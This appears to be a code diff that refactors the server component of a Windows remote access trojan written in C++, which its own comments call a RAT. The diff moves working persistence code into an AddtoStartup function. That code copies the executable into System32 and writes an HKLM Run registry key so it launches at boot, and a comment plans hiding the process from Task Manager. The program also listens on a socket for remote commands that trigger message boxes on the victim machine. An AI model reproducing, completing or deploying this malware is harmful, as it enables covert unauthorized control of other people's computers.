@@ -1,87 +1,15 @@
-#include <iostream>
-#include <stdlib.h>
-#include <winsock2.h>
-#include <windows.h>
-#include <map>
-#include <string>
-#include <Shlwapi.h> //NOTE LINKER SETTINGS: -lShlwapi
-#include <process.h>
-
-
-
-//NOTE, should we leave it as preprocessor definitions? Or go the "correct" way and use const variables? Its your choice.
-#define IP_ADDR "127.0.0.1" //THIS VARIABLE WILL BE CHANGED AS THE CLIENT PROGRAM IS TAILORED TO THE USER'S SETTINGS.
-#define PORTNO 80 //THIS VARIABLE WILL BE CHANGED AS CLIENT PROGRAM IS TAILORED TO THE USER'S SETTINGS
-#define PROGRAM_NAME "fuck.exe" //THIS WILL BE THE PROGRAM FILE NAME
-
-//functions used to multithread.
-unsigned int __stdcall TrigBox(void*);
-
-//namespace declarations
-using std::string;
-using std::map;
-
-//enumerate server messages so we can process them!
-enum SERVERMESSAGE {TRIGMSGBOX, MESSAGE2, MESSAGE3}; //ENUMERATE SERVER COMMANDS, 0 = MESSAGE1, 1 = MESSAGE2
-
-
-//map the c-style strings to each enumeration or UINT type for our messageboxes.
-  map<string, SERVERMESSAGE> dictionary;
-  map<string, UINT> MSGBOX_TYPES;
- map<string, UINT> MSGBOX_ICONS;
-const int buffersize = 5000;
-
-
-string client_operator;
-string client_operand;
-string ipaddress = IP_ADDR;
-
-int portnumber = PORTNO;
-
+#include "server_header.h"
 
 int main(){
 
-    /*FIRST THING WE DO IS COPY SERVER.EXE TO SYSTEM32 FOLDER AND THEN MAKE A REGISTRY KEY THAT OPENS SERVER.EXE AT STARTUP*/
-    //NOTE we still have to implement the process hiding in task manager!~
-    std::string filename ="\\";
-    char system[MAX_PATH];
-    char pathtofile[MAX_PATH];
-
-    //GET MODULE HANDLE OF CALLING PROGRAM I.E SERVER.EXE'S HANDLE
-    HMODULE GetModH = GetModuleHandle(NULL);
-
-    //GET PATH OF SERVER.EXE
-    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
-
-    filename.append(PathFindFileNameA(pathtofile));
-
-    //GET SYSTEM DIRECTORY LIKE SYSTEM32 OR SYSWOW64, FOR COMPATIBILITY REASONS
-    GetSystemDirectory(system,sizeof(system));
-
-    //APPEND MY FILENAME AFTER THE SYSTEMDIRECTORY SO WE CAN DROP OUR SERVER INTO THE SYSTEM 32 FOLDER
-    strcat(system, filename.c_str());
-
-    //COPY SERVER TO THE SYSTEM32 FOLDER
-    CopyFile(pathtofile,system,false);
-
-    //MAKE A REGISTRY KEY TO THE SYSTEM32FOLDER WITH SERVER.EXE TO RUN AT STARTUP
-    HKEY hKey;
-
-    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
-
-
-    RegSetValueEx(hKey, "serv",0,REG_SZ,(const unsigned char*)system,sizeof(system));
-
-    RegCloseKey(hKey);
-
-    /*------------------------------------------------------------------------------------------------------------------*/
+    AddtoStartup();
 
 //map the server enumerated commands so I can recv a string to match with!
     dictionary["TRIGMSGBOX"] = TRIGMSGBOX;
     dictionary["MESSAGE2"] = MESSAGE2;
     dictionary["MESSAGE3"] = MESSAGE3;
 
-        //Map messagebox responses!
+//Map messagebox responses!
     MSGBOX_TYPES["Abort Retry Ignore"]                    = MB_ABORTRETRYIGNORE;
     MSGBOX_TYPES["Help MsgBox (note WM_HELP not used)"]   = MB_HELP;
     MSGBOX_TYPES["Ok Cancel"]                             = MB_OKCANCEL;
@@ -95,7 +23,7 @@ int main(){
 
 
 
-    /*INITIALIZE WINSOCKETS FOR OUR RAT, WE WILL BE COMMUNICATING WITH CLIENT TO MANIPULATE THE HOST*/
+/*INITIALIZE WINSOCKETS FOR OUR RAT, WE WILL BE COMMUNICATING WITH CLIENT TO MANIPULATE THE HOST*/
     WSADATA wsa;
     SOCKET sa, clientsock;
     struct sockaddr_in server, client;
@@ -104,25 +32,18 @@ int main(){
     bool KILLSERVER = true;
 
 
-    if (WSAStartup(MAKEWORD(2,2), &wsa)!=0)  {
-              //more error checking
-            return -1;
-       }
+    HandleError(WSAStartup(MAKEWORD(2,2), &wsa));
 
-    if ((sa = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET){
+    HandleError((sa = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET);
 
-            return -1;
-    }
 
     server.sin_addr.s_addr = inet_addr (ipaddress.c_str());      //initialize members of server structure
     server.sin_family = AF_INET;
     server.sin_port = htons(portnumber);
 
-    if (bind(sa, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR){
-        return -1;
-    }
+    HandleError(bind(sa, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR);
 
-    listen(sa, SOMAXCONN);
+    HandleError(listen(sa, SOMAXCONN));
 
     while(KILLSERVER){
 
@@ -153,10 +74,9 @@ int main(){
 
 
 
-            while((recv(clientsock, server_reply, buffersize, 0)) == SOCKET_ERROR){     //error checking combined with recv function
+            HandleError(recv(clientsock, server_reply, buffersize, 0));//error checking combined with recv function
 
-                return -1;
-            }
+
         //CLEAR STRING BEFORE PROCESSING! MAKES THINGS NICE AND CLEAN!!
         client_operator.clear();
         client_operand.clear();
@@ -244,3 +164,52 @@ unsigned int __stdcall TrigBox(void* data){
 
     return 0;
 }
+
+void AddtoStartup(){
+ /*FIRST THING WE DO IS COPY SERVER.EXE TO SYSTEM32 FOLDER AND THEN MAKE A REGISTRY KEY THAT OPENS SERVER.EXE AT STARTUP*/
+    //NOTE we still have to implement the process hiding in task manager!~
+    std::string filename ="\\";
+    char system[MAX_PATH];
+    char pathtofile[MAX_PATH];
+
+    //GET MODULE HANDLE OF CALLING PROGRAM I.E SERVER.EXE'S HANDLE
+    HMODULE GetModH = GetModuleHandle(NULL);
+
+    //GET PATH OF SERVER.EXE
+    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
+
+    filename.append(PathFindFileNameA(pathtofile));
+
+    //GET SYSTEM DIRECTORY LIKE SYSTEM32 OR SYSWOW64, FOR COMPATIBILITY REASONS
+    GetSystemDirectory(system,sizeof(system));
+
+    //APPEND MY FILENAME AFTER THE SYSTEMDIRECTORY SO WE CAN DROP OUR SERVER INTO THE SYSTEM 32 FOLDER
+    strcat(system, filename.c_str());
+
+    //COPY SERVER TO THE SYSTEM32 FOLDER
+    CopyFile(pathtofile,system,false);
+
+    //MAKE A REGISTRY KEY TO THE SYSTEM32FOLDER WITH SERVER.EXE TO RUN AT STARTUP
+    HKEY hKey;
+
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
+
+
+    RegSetValueEx(hKey, "serv",0,REG_SZ,(const unsigned char*)system,sizeof(system));
+
+    RegCloseKey(hKey);
+}
+
+int HandleError(int error){
+
+    if (error == SOCKET_ERROR){
+
+        stringstream ss;
+        ss <<"Error: " << WSAGetLastError() << " From WSAGetLastError() From WSAStart() !";
+        MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
+
+    }else return 0;
+
+    return SOCKET_ERROR;
+}
+
